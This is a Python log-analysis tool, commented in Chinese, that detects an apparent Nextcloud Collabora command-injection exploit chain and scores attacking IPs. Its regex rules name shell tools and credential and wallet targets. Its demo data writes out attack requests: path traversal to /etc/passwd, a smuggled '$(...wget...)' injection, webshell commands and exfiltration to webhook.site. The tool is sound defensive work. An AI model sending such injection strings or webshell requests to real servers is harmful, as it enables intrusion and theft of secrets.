#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CollaboraWatch — 针对 CVE-2026-110447 的 Nextcloud 利用链检测

CVE-2026-110447: Nextcloud Collabora Online 内置 CODE 服务器
(richdocumentscode) < 26.4.303 存在 OS 命令注入，未授权 RCE，
2026 年 9–10 月在野利用。攻击链（公开取证: Collabora
richdocumentscode issue #354 + 安全媒体报道）:

  1. 探测/利用: GET /apps/richdocumentscode/proxy.php?status，
     参数带 URL 编码路径穿越 (%2e%2e 等)，经 remote_font_config.url
     未转义传入 sh，配合 $() 与 ${IFS} 空白混淆执行命令
  2. 落地: Base64 载荷在 /apps/richdocumentscode/ 下释放
     shx*.php / shrf*.php webshell
  3. 确认: 把系统信息发往外部 webhook.site URL
  4. 发现: 以 www-data 身份搜 *.kdbx / wallet.dat / 密码管理器目录

本工具读 Web 访问日志 + 出站流量日志 + 应用版本快照，
按攻击 IP 输出 0–100 风险分与处置建议。纯标准库，离线可跑。
"""

import argparse
import json
import re
import sys
from collections import defaultdict
from datetime import datetime, timedelta

# ---------------------------------------------------------------- 规则常量

PROXY_PATH = "/apps/richdocumentscode/proxy.php"
PATCHED_VERSION = (26, 4, 303)
WEBSHELL_RE = re.compile(r"/apps/richdocumentscode/(shx[\w\-]*|shrf[\w\-]*)\.php",
                         re.IGNORECASE)

# 编码路径穿越（%2e%2e / %252e 双重编码 / ..%2f / ..\ 变体）
TRAVERSAL_RES = [
    re.compile(p, re.IGNORECASE) for p in (
        r"%2e%2e", r"%252e", r"%252f", r"%255c",
        r"\.\.%2f", r"\.\.%5c", r"\.\./", r"\.\.\\",
    )
]

# Shell 命令注入指纹：$() / ${IFS} / 反引号 / ;|& 连接符 / 编码形态
INJECTION_RES = [
    re.compile(p, re.IGNORECASE) for p in (
        r"\$\(", r"\$\{IFS\}", r"%24%28", r"%7bIFS%7d",
        r"`[^`]{0,60}`", r";\s*(?:sh|bash|wget|curl|python|perl|php)\b",
        r"\|\s*(?:sh|bash|wget|curl|nc)\b", r"&&\s*(?:wget|curl|chmod)\b",
    )
]

# 查询参数里超长的 Base64 载荷（落地阶段）
B64_RE = re.compile(r"[A-Za-z0-9+/]{80,}={0,2}")

# webshell 落地后常见的"发现"行为关键字（出现在 webshell 的查询参数/路径里）
DISCOVERY_KEYWORDS = {
    ".kdbx": r"\.kdbx",
    "wallet.dat": r"wallet\.dat",
    "keystore.json": r"keystore\.json",
    "Bitwarden": r"bitwarden",
    "1Password": r"1password",
    "KeePass": r"keepass",
    "Bitcoin": r"bitcoin",
    "Monero": r"monero",
    "Ethereum": r"ethereum",
}
DISCOVERY_RES = [(name, re.compile(p, re.IGNORECASE))
                 for name, p in DISCOVERY_KEYWORDS.items()]

ALERT_THRESHOLD = 50


def parse_version(s):
    """'26.4.302' -> (26, 4, 302)，解析失败返回 None"""
    try:
        return tuple(int(x) for x in str(s).strip().split("."))
    except (ValueError, AttributeError):
        return None


def parse_access_line(line):
    """ts=<ISO> ip=<ip> method=<M> uri=<u> status=<c> bytes=<n> [ua=\"...\"]"""
    kv = {}
    for m in re.finditer(r'(\w+)=("[^"]*"|\S+)', line):
        kv[m.group(1)] = m.group(2).strip('"')
    if "ts" not in kv or "ip" not in kv or "uri" not in kv:
        return None
    return kv


def parse_flow_line(line):
    """ts=<ISO> src=<ip> dst=<ip> host=<hostname> bytes=<n>"""
    kv = {}
    for m in re.finditer(r'(\w+)=("[^"]*"|\S+)', line):
        kv[m.group(1)] = m.group(2).strip('"')
    if "src" not in kv:
        return None
    return kv


def analyze(access_lines, flow_lines, config):
    vuln_hosts = {}  # host -> version(受影响)
    if config:
        apps = config.get("apps", [config]) if isinstance(config, dict) else []
        for app in apps:
            if not isinstance(app, dict):
                continue
            name = str(app.get("app", app.get("name", ""))).lower()
            if "richdocumentscode" not in name:
                continue
            host = app.get("host", "nextcloud")
            ver = parse_version(app.get("version", ""))
            if ver is not None and ver < PATCHED_VERSION:
                vuln_hosts[host] = app.get("version")

    hits = defaultdict(lambda: {"score": 0, "rules": [], "evidence": []})

    def add(ip, points, rule, evidence):
        h = hits[ip]
        h["score"] = min(100, h["score"] + points)
        h["rules"].append(rule)
        h["evidence"].append(evidence)

    proxy_hits = defaultdict(int)

    for ln, raw in enumerate(access_lines, 1):
        kv = parse_access_line(raw)
        if kv is None:
            continue
        ip, uri = kv["ip"], kv["uri"]
        uri_l = uri.lower()

        # R1: proxy.php 命令注入探测/利用
        if PROXY_PATH in uri_l:
            trav = [r.pattern for r in TRAVERSAL_RES if r.search(uri)]
            inj = [r.pattern for r in INJECTION_RES if r.search(uri)]
            b64 = bool(B64_RE.search(uri))
            if trav or inj or b64:
                proxy_hits[ip] += 1
                detail = []
                if trav:
                    detail.append("编码路径穿越")
                if inj:
                    detail.append("shell注入指纹($()/IFS/连接符)")
                if b64:
                    detail.append("超长Base64载荷")
                add(ip, 30, "R1 proxy.php命令注入",
                    "access.log:%d %s %s [%s]" % (ln, ip, uri[:120],
                                                   "+".join(detail)))

        # R2: webshell 落地/访问
        m = WEBSHELL_RE.search(uri)
        if m:
            add(ip, 40, "R2 webshell落地",
                "access.log:%d %s 请求 %s (status=%s)" %
                (ln, ip, m.group(0), kv.get("status", "?")))

        # R4 附带: webshell 发起的"发现"行为
        if m or "shx" in uri_l or "shrf" in uri_l:
            disc = [name for name, r in DISCOVERY_RES if r.search(uri)]
            if disc:
                add(ip, 15, "R4 凭证/钱包发现",
                    "access.log:%d %s webshell请求含发现关键字 %s" % (ln, ip, disc[0]))

    # R1 持续利用加成：同一 IP 多次命中 proxy.php
    for ip, n in proxy_hits.items():
        if n >= 2:
            add(ip, 10, "R1 持续利用",
                "%d 次命中 proxy.php 注入指纹，疑似批量/持续利用" % n)

    # R3: 外联确认（webhook.site）
    for ln, raw in enumerate(flow_lines, 1):
        kv = parse_flow_line(raw)
        if kv is None:
            continue
        host = kv.get("host", "")
        if "webhook.site" in host.lower():
            add(kv["src"], 25, "R3 外联确认",
                "flow.log:%d %s -> %s (%s bytes，疑似回传系统信息)" %
                (ln, kv["src"], host, kv.get("bytes", "?")))

    # 暴露面: 攻击过存在漏洞版本的 IP 额外加权
    if vuln_hosts:
        for ip in list(hits):
            if any(r.startswith("R1") for r in hits[ip]["rules"]):
                add(ip, 10, "R5 暴露面",
                    "目标装有 richdocumentscode %s (< 26.4.303，未修复)"
                    % ", ".join(vuln_hosts.values()))

    alerts = []
    for ip, h in hits.items():
        if h["score"] >= ALERT_THRESHOLD:
            alerts.append({"ip": ip, "score": h["score"],
                           "rules": sorted(set(h["rules"])),
                           "evidence": h["evidence"]})
    alerts.sort(key=lambda a: -a["score"])
    return {"vulnerable_hosts": vuln_hosts, "alerts": alerts,
            "scanned_ips": len(hits)}


def render(result):
    out = []
    out.append("=" * 60)
    out.append("CollaboraWatch 检测报告 (CVE-2026-110447)")
    out.append("=" * 60)
    if result["vulnerable_hosts"]:
        out.append("[暴露面] 以下主机 richdocumentscode 未修复(<26.4.303):")
        for host, ver in result["vulnerable_hosts"].items():
            out.append("  - %s : %s  -> 建议立即升级到 26.4.303+ 或卸载该应用"
                       % (host, ver))
    else:
        out.append("[暴露面] 未发现受影响版本（或未提供版本快照）。")
    out.append("[扫描] 共 %d 个源 IP 命中规则，%d 个达到告警阈值(>=%d)。" %
               (result["scanned_ips"], len(result["alerts"]), ALERT_THRESHOLD))
    out.append("")
    if not result["alerts"]:
        out.append("未发现告警。")
    for a in result["alerts"]:
        out.append("-" * 60)
        out.append("告警 IP: %s   风险分: %d/100   命中: %s" %
                   (a["ip"], a["score"], "、".join(a["rules"])))
        for ev in a["evidence"]:
            out.append("    * %s" % ev)
        out.append("  建议: 隔离该 IP→封禁; 检查 /apps/richdocumentscode/ 下 "
                   "shx*/shrf*.php; 杀 www-data 可疑进程; 轮换 Web 服务用户可触达的密钥。")
    out.append("=" * 60)
    return "\n".join(out)


# ---------------------------------------------------------------- 演示数据

def demo_data():
    t0 = datetime(2026, 10, 18, 22, 0, 0)
    L = []

    def acc(dt, ip, method, uri, status=200, nbytes=512, ua="Mozilla/5.0"):
        L.append('ts=%s ip=%s method=%s uri="%s" status=%d bytes=%d ua="%s"' %
                 (dt.isoformat(), ip, method, uri, status, nbytes, ua))

    # 正常管理员：日常用 proxy.php 看文档状态
    acc(t0, "10.0.0.5", "GET", "/apps/richdocumentscode/proxy.php?status", 200, 128)
    acc(t0 + timedelta(minutes=3), "10.0.0.5", "GET", "/index.php/apps/files/", 200, 2048)

    # 扫描器：只做编码穿越探测，未带注入载荷
    s = t0 + timedelta(minutes=10)
    acc(s, "45.155.38.21", "GET",
        "/apps/richdocumentscode/proxy.php?status&x=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        500, 64, "curl/8.0")

    # 完整利用链攻击者
    a = t0 + timedelta(minutes=30)
    pay = ("a" * 20 + "eyJmaWxlIjoiL3RtcC94LnBocCJ9" + "A" * 80)  # Base64 载荷示意
    acc(a, "185.220.70.9", "GET",
        "/apps/richdocumentscode/proxy.php?status&remote_font_config.url="
        "%2e%2e%2f%24%28id%3b${IFS}wget${IFS}http%3a%2f%2fx%2fp%29", 500, 96,
        "python-requests/2.31")
    acc(a + timedelta(minutes=2), "185.220.70.9", "GET",
        "/apps/richdocumentscode/proxy.php?status&f=" + pay, 500, 96,
        "python-requests/2.31")
    acc(a + timedelta(minutes=5), "185.220.70.9", "GET",
        "/apps/richdocumentscode/shx7f2a.php?c=id", 200, 256,
        "python-requests/2.31")
    acc(a + timedelta(minutes=6), "185.220.70.9", "GET",
        "/apps/richdocumentscode/shx7f2a.php?find=*.kdbx", 200, 1024,
        "python-requests/2.31")

    F = []
    F.append("ts=%s src=185.220.70.9 dst=46.101.88.12 host=webhook.site "
             "bytes=2314" % (a + timedelta(minutes=7)).isoformat())
    F.append("ts=%s src=10.0.0.5 dst=140.82.114.4 host=github.com bytes=5120" %
             (t0 + timedelta(minutes=1)).isoformat())

    C = {"apps": [
        {"host": "cloud.example.com", "app": "richdocumentscode",
         "version": "26.4.302"},
        {"host": "cloud2.example.com", "app": "richdocumentscode",
         "version": "26.4.303"},
    ]}
    return L, F, C


def main(argv=None):
    ap = argparse.ArgumentParser(description="CollaboraWatch: CVE-2026-110447 利用链检测")
    ap.add_argument("--demo", action="store_true", help="用内置演示数据运行")
    ap.add_argument("--access", help="Web 访问日志文件")
    ap.add_argument("--flows", help="出站流量日志文件")
    ap.add_argument("--config", help="应用版本快照 JSON 文件")
    ap.add_argument("--json", action="store_true", help="输出 JSON")
    args = ap.parse_args(argv)

    if args.demo:
        access_lines, flow_lines, config = demo_data()
    else:
        if not args.access:
            ap.error("--demo 或 --access 二选一")
        with open(args.access, encoding="utf-8", errors="replace") as f:
            access_lines = f.read().splitlines()
        flow_lines = []
        if args.flows:
            with open(args.flows, encoding="utf-8", errors="replace") as f:
                flow_lines = f.read().splitlines()
        config = None
        if args.config:
            with open(args.config, encoding="utf-8") as f:
                config = json.load(f)

    result = analyze(access_lines, flow_lines, config)
    if args.json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
    else:
        print(render(result))
    return 0 if result["alerts"] else 2


if __name__ == "__main__":
    sys.exit(main())
